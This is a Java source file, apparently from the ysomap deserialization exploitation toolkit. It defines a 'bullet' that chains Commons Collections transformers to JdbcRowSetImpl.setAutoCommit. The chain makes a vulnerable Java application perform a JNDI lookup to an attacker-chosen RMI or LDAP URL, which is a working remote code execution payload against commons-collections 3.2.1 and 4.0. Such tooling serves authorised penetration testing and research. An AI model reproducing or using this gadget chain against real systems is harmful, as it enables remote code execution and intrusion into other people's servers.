package ysomap.bullets.collections;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.JdbcRowSetImplBullet;
import ysomap.common.annotation.*;

import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("向外发起jndi连接，需指定远程RMI/LDAP服务")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithJNDIBullet extends AbstractTransformerBullet {

    @NotNull
    @Require(name="jndiURL",detail="jndi lookup url, like rmi://xxxx:1099/xxxx")
    public String jndiURL;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        Bullet jdbcRowSetImpl = new JdbcRowSetImplBullet();
        jdbcRowSetImpl.set("jndiURL", jndiURL);
        Object obj = jdbcRowSetImpl.getObject();

        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(obj));
        transformers.add(createInvokerTransformer("setAutoCommit",
                            new Class[] {boolean.class}, new Object[]{true}));
        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerWithJNDIBullet();
        bullet.set("jndiURL", args[0]);
        bullet.set("version", args[1]);
        return bullet;
    }
}
